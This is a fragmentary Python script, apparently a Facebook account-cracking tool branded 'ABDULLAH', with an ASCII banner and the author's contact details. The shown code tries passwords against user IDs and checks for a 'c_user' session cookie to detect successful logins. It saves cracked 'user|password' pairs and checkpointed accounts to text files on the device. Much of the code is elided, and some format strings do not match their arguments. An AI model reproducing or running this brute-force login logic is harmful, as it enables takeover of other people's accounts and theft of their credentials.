...
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$ |$$  __$$ |$$ |  $$ |
$$ |  $$ |$$$$$$$  |\$$$$$$$ |\$$$$$$  |$$ |$$ |\$$$$$$$ |$$ |  $$ |
\__|  \__|\_______/  \_______| \______/ \__|\__| \_______|\__|  \__|
...
\ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Facebook : https://www.facebook.com/ishq.khan.9828

    Connect  : +923189269701
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/ABDULLAH-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/ABDULLAH-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1m [!] Tool    : ABDULLAH")

			print (" [!] Brand   : ABDULLAH")

			print(" [!] Expired : No limit")

			print (" [!] Status  : \033[1;92mBHAI LOG BAS DUA DYNA \033[1;97m")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ABDULLAH-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/ABDULLAH_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/ABDULLAH_CP.txt' , 'a').write('%s\n' % wrt)
